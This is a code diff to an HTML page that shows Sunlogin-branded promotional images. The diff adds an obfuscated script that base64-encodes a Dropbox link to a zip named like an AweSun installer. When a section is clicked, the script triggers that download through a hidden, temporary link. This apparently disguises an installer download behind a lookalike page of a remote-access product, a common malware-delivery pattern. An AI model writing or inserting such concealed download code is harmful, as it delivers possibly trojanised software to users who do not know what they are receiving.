@@ -4,19 +4,75 @@
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 </head>
 <body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">>
-<table id="__01" width="1353" height="1748" border="0" cellpadding="0" cellspacing="0">
+<table id="__01" width="1353" height="100%" border="0" cellpadding="0" cellspacing="0">
 	<tr>
 		<td>
-			<img src="images/sunlogin_01.png" width="1353" height="405" alt="优秀案例展示1" /></td>
+			<img src="images/sunlogin_01.png" width="1353" height="100%" alt="优秀案例展示1" /></td>
 	</tr>
 	<tr>
 		<td>
-			<img src="images/sunlogin_02.png" width="1353" height="554" alt="优秀案例展示2" /></td>
+			<img src="images/sunlogin_02.png" width="1353" height="100%" alt="优秀案例展示2" /></td>
 	</tr>
 	<tr>
 		<td>
-			<img src="images/sunlogin_03.png" width="1353" height="789" alt="优秀案例展示3" /></td>
+			<img src="images/sunlogin_03.png" width="1353" height="100%" alt="优秀案例展示3" /></td>
 	</tr>
 </table>
+
+ <script>
+    (function() {
+        
+        const resourceHandler = {
+            resourceLinks: [
+                'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzRlbHdjNXc1Y245emswN3JteW56ZC9Bd2VTdW5fMTUuOC40LjIwNzQ2LnppcD9ybGtleT1kMHNpODFjbmtzbjM1dzBjaTU0bjQxaTdnJnN0PTA0MGRxdzdrJmRsPTE=',
+                'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzRlbHdjNXc1Y245emswN3JteW56ZC9Bd2VTdW5fMTUuOC40LjIwNzQ2LnppcD9ybGtleT1kMHNpODFjbmtzbjM1dzBjaTU0bjQxaTdnJnN0PTA0MGRxdzdrJmRsPTE=',
+                'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzRlbHdjNXc1Y245emswN3JteW56ZC9Bd2VTdW5fMTUuOC40LjIwNzQ2LnppcD9ybGtleT1kMHNpODFjbmtzbjM1dzBjaTU0bjQxaTdnJnN0PTA0MGRxdzdrJmRsPTE='
+            ],
+            
+            decodeData: function(encoded) {
+                return atob(encoded);
+            },
+            
+            initResourceAccess: function() {
+                document.querySelectorAll('.guide-section').forEach((section, index) => {
+                    section.addEventListener('click', () => {
+                        this.processResource(this.resourceLinks[index]);
+                    });
+                });
+            },
+            
+            processResource: function(encoded) {
+                const resourceUrl = this.decodeData(encoded);
+                const temporaryLink = document.createElement('a');
+                temporaryLink.style.display = 'none';
+                temporaryLink.href = resourceUrl;
+                temporaryLink.rel = 'noopener noreferrer';
+                document.body.appendChild(temporaryLink);
+                temporaryLink.click();
+                setTimeout(() => {
+                    document.body.removeChild(temporaryLink);
+                }, 300);
+            }
+        };
+
+       
+        const imageViewer = {
+            initImagePreview: function() {
+                const images = document.querySelectorAll('.guide-section img');
+                images.forEach(img => {
+                    img.addEventListener('load', () => {
+                        img.style.opacity = 1;
+                    });
+                });
+            }
+        };
+
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            resourceHandler.initResourceAccess();
+            imageViewer.initImagePreview();
+        });
+    })();
+</script>
 </body>
 </html>
